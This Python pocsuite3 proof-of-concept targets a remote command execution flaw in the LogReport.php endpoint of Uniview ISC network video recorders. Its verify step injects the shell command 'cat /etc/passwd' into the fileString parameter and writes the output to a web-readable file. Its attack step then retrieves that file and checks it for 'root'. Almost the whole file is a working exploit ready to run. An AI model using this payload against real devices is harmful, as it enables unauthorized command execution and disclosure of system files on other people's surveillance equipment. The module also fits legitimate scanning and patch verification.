# -*- coding: utf-8 -*-
# 2023/12/11 16:43

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OrderedDict, OptString


class yushi_isc_logreport_RCE(POCBase):
    author = '炼金术师诸葛亮'
    createDate = '2023-12-11'
    name = 'yushi-isc-logreport-RCE'
    appName = 'yushi-isc-logreport-RCE'
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '浙江宇视 isc 网络视频录像机 LogReport.php 远程命令执行漏洞'  # 漏洞简要描述

    def _verify(self):
        result = {}
        path = "/Interface/LogReport/LogReport.php"  # 参数
        url = self.url + path
        payload = "?action=execUpdate&fileString=x%3bcat%20/etc/passwd%3eqwer1234.txt"  # payload
        headers = {
            'Cookie': 'PHPSESSID=7b9bab286911f705a76e3c9cb5a14507; logintime=-; devLanguage=zh-CN',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close'
        }
        r = requests.get(url + payload,headers=headers)
        print(r.text)
        # 验证成功输出相关信息
        if r.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Name'] = payload

        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/Interface/LogReport/qwer1234.txt"
        url = self.url + path
        headers2={
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
        }

        r = requests.get(url,headers=headers2)
        if r and r.status_code == 200 and "root" in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Resp'] = r.text

        return self.parse_output(result)

register_poc(yushi_isc_logreport_RCE)